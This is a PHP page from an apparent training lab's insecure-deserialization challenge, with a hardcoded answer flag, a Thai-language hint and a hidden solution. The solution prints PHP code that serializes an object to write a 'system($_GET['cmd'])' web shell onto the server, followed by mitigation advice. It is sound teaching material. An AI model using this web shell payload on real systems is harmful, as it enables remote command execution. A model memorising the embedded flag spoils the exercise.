<?php $page = 'ch13';?>
<?php
        if(isset($_POST["en_pass"])){
        $flag = $_POST["en_pass"];
            if($flag == "flag{y0u_r_th3_seri4l_k!ller!!!}"){
                $isPass = true;
                $ch = 13;
                require_once('database/setState.php');
            }
            else {
                $isPass = false;
            }
        }
?>
<?php require_once('header.php') ?>
<?php require_once('header_home.php') ?>
    <div class="bg-main">
        <div class="content-wrapper mx-0">
            <div class="content-banner">
                <div class="header-score">
                    <div>
                        <h1>Insecure Deserialization&nbsp;<span>(175 points)</span></h1>
                        <h4>Redeem Item Code</h4>
                    </div>
                </div>
                <div class="detail-cha mt-5">
                    <div class="description">
                        <h5>Description</h5>
                        <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Rerum quisquam inventore, quaerat nisi ad pariatur distinctio doloribus ut, deserunt debitis, excepturi tempora dignissimos nemo a. Aliquid et eum esse sed?</p>
                    </div>
                    <div>
                        <h5>Goal</h5>
                        <p>Bypass login and access to the webpage.</p>
                        <a href="ch13/redeem.php" target="_blank" class="btn btn-primary" role="button">Start the Lab</a>            
                    </div>
                    <div>
                        <h5>Validation</h5>
                        <?php
                            if(isset($isPass)){
                                if($isPass){
                                    echo '<div class="alert alert-success">Well Done!</div>';
                                }
                                else {
                                    echo'<div class="alert alert-danger">Nahh Try it again.</div>';
                                }
                            }
                        ?>
                        <form action="" method="POST">
                            <label for="en_pass">Enter flag :</label>
                            <input type="text" name="en_pass">
                            <button type="submit">Send</button>
                        </form>
                    </div>
                    <div>
                        <h5>Related ressource(s)</h5>
                        <ul class="resource"> 
                            <li><a target="_blank" href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization">Insecure Deserialization</a></li>
                            <li><a target="_blank" href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/">Remote code execution via PHP</a></li>
                        </ul>
                    </div>
                    <div>
                        <ul class="accordion" id="investAccordion">
                            <li>
                                <h5 class="invest-collapse collapsed" id="headingOne" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">Hint</h5>
                                <div id="collapseOne" class="collapse" aria-labelledby="headingOne" data-parent="#investAccordion">
                                - อะไรอยู่ข้างใน Redeem Code ,มันเขียนไฟล์ได้ ?! (keyword: php deserialization)
                                </div>    
                            </li>
                            <li>
                                <h5 class="invest-collapse collapsed" id="headingTwo" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo">Solution</h5>
                                <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#investAccordion">  
                                     <!-- Button trigger modal -->
                                     <button type="button" class="solution btn btn-primary" data-toggle="modal" data-target="#exampleModalLong">
                                    Are you sure ?
                                    </button>
                                    <!-- Modal -->
                                    <div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
                                        <div class="modal-dialog" role="document">
                                            <div class="modal-content">
                                                <div class="modal-body m-3 pb-0">
                                                    <h5 class="mb-2">Solution</h5>
                                                    - เมื่อเข้ามาถึงหน้านี้จะพบว่า เป็นหน้าที่ใช้สำหรับ Submit Redeem Code และมีตัวอย่างของโค้ดอยู่เมื่อใส่ไป จะเห็นว่ามี ลิสต์ I003 เพิ่มขึ้น เมื่อกดที่ลิ้ง จะพบว่าเป็นไฟล์ text ที่มีข้อมูลของ Item เก็บอยู่ ย้อนกลับมาส่วนของ Code เมื่อนำไป Base64 decode จะได้<br>
                                                        "O:4:"Item":4:{s:2:"id";s:4:"I003";s:4:"name";s:12:"Lunatic Card";s:11:"description";s:45:"LUK + 1, Critical Rate + 1, Perfect Dodge + 1";s:5:"price";i:10;}"<br>
                                                    ซึ่งเป็น string ของ php serialization โจทย์ข้อนี้จะทำการ Base64 decode และ unserialize และเขียน ข้อมูลของ object นั้นๆ ลงเป็นไฟล์ เมื่อรู้แบบนี้แล้วเราจะสามารถทำการ เขียน php shell ลงไปได้ โดยเริ่มจาก เขียนคลาส Item แล้วก็ attribute ข้างในตามโครงสร้าง จากนั้นก็ new object ,serialize(object) และ แสดง Base64 encode ของมันออกมา ดังโค้ดต่อไปนี้
                                                    <br><br>
                                                        &lt;?php<br>
                                                        <div class="ml-4">// solution<br>
                                                        class Item {<br>
                                                        public $id = "shell.php";<br>
                                                        public $name = "&lt;?php system(\$_GET['cmd']); ?&gt;";<br>
                                                        public $description = "";<br>
                                                        public $price = "";<br>
                                                        }<br><br>

                                                        $obj = new Item;<br>
                                                        $s = serialize($obj);<br>
                                                        echo base64_encode($s);</div>
                                                        ?&gt;<br><br>

                                                    และจะได้ Redeem Code ออกมา เมื่อเอาไป redeem จะได้ไฟล์ php shell และ สามารถรัน os command ได้ ทำให้อ่าน ค่า flag ออกมาได้
                                                    <h5 class="mt-3 mb-2">Recommendation</h5>
                                                    - การป้องกัน Insecure Deserialization คือการหลีกเลี่ยงการใช้ให้มากที่สุด หรือใช้ Library ที่มีการ Secure Deserialization ให้ หากจำเป็นต้องให้ ต้องมีการทำ Input validation หรือ การกำหนดให้ สามาร deserialization ได้เฉพาะ sign data เท่านั้น
                                                </div>
                                                <div class="modal-footer mt-0 pt-2 px-4">
                                                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>    
                            </li>
                        </ul>                        
                    </div>
                </div>
            </div>    
        </div>
    </div>
</div>  <!-- for nav-bar -->